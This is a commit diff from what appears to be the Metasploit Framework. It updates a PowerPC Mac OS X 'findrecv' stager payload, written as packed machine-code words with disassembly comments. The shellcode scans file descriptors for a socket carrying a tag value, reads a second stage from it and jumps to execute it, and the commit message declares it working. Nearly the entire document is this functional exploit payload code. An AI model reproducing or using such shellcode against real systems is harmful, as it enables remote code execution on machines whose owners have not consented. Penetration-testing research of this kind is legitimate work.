478dc05dd4a375fd81b91ac0cd63c796f02a331d
HD Moore <hd_moore@rapid7.com>
2004-12-10 09:44:53 +0000

    Working OS X findrecv code :) :) :)

--- lib/Msf/PayloadComponent/OSXFindStager.pm
+++ lib/Msf/PayloadComponent/OSXFindStager.pm
@@ -19,23 +19,25 @@ my $info =
         Offsets => { },   
         Payload =>
 		pack("N*",
-			 0x3ba00fff,     # 0x1dbc <main>:          li      r29,4095
-			 0x7fa903a6,     # 0x1dc0 <main+4>:        mtctr   r29
-			 0x381df067,     # 0x1dc4 <findsock>:      addi    r0,r29,-3993
-			 0x7c6902a6,     # 0x1dc8 <findsock+4>:    mfctr   r3
-			 0x3881eff8,     # 0x1dcc <findsock+8>:    addi    r4,r1,-4104
-			 0x38a00fff,     # 0x1dd0 <findsock+12>:   li      r5,4095
-			 0x7cc63279,     # 0x1dd4 <findsock+16>:   xor.    r6,r6,r6
-			 0x44ffff02,     # 0x1dd8 <findsock+20>:   sc
-			 0x7cc63279,     # 0x1ddc <findsock+24>:   xor.    r6,r6,r6
-			 0x7fc902a6,     # 0x1de0 <findsock+28>:   mfctr   r30
-			 0xa381eff8,     # 0x1de4 <findsock+32>:   lhz     r28,-4104(r1)
-			 0x2c1c1337,     # 0x1de8 <findsock+36>:   cmpwi   r28, 0x1337
-			 0x4002ffd8,     # 0x1dec <findsock+40>:   bdnzf+  eq,0x1dc4 <findsock>
-			 0x3881effc,     # 0x1df0 <gotsock>:       addi    r4,r1,-4100
-			 0x7c8903a6,     # 0x1df4 <gotsock+4>:     mtctr   r4
-			 0x4c810420,     # 0x1df8 <gotsock+8>:     blectr
-			 0x7cc63279,     # 0x1dfc <gotsock+12>:    xor.    r6,r6,r6
+			0x3ba00fff,     # 0x1db8 <main>:          li      r29,4095
+			0x3bc00fff,     # 0x1dbc <main+4>:        li      r30,4095
+			0x379df002,     # 0x1dc0 <main+8>:        addic.  r28,r29,-4094
+			0x7fdcf051,     # 0x1dc4 <findsock>:      subf.   r30,r28,r30
+			0x4180fff0,     # 0x1dc8 <findsock+4>:    blt+    0x1db8 <main>
+			0x381df067,     # 0x1dcc <findsock+8>:    addi    r0,r29,-3993
+			0x7fc3f378,     # 0x1dd0 <findsock+12>:   mr      r3,r30
+			0x3881eff8,     # 0x1dd4 <findsock+16>:   addi    r4,r1,-4104
+			0x38a00fff,     # 0x1dd8 <findsock+20>:   li      r5,4095
+			0x38ddf081,     # 0x1ddc <findsock+24>:   addi    r6,r29,-3967
+			0x44ffff02,     # 0x1de0 <findsock+28>:   sc
+			0x7cc63279,     # 0x1de4 <findsock+32>:   xor.    r6,r6,r6
+			0xa361eff8,     # 0x1de8 <findsock+36>:   lhz     r27,-4104(r1)
+			0x2c1b1337,     # 0x1dec <findsock+40>:   cmpwi   r27,4919
+			0x4082ffd4,     # 0x1df0 <findsock+44>:   bne+    0x1dc4 <findsock>
+			0x3881effc,     # 0x1df4 <gotsock>:       addi    r4,r1,-4100
+			0x7c8903a6,     # 0x1df8 <gotsock+4>:     mtctr   r4
+			0x4c810420,     # 0x1dfc <gotsock+8>:     blectr
+			0x7cc63279,     # 0x1e00 <gotsock+12>:    xor.    r6,r6,r6
 			 ),
     },
 };
